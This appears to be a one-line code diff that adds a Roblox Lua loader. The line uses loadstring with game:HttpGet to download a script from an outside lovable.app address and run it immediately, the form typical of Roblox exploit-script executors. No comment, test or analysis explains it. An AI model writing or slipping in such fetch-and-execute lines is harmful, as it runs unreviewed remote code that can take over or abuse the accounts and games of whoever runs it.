@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://still-frame-hero.lovable.app/raw/jordanryanm271/lua-studio-anti-bat"))()
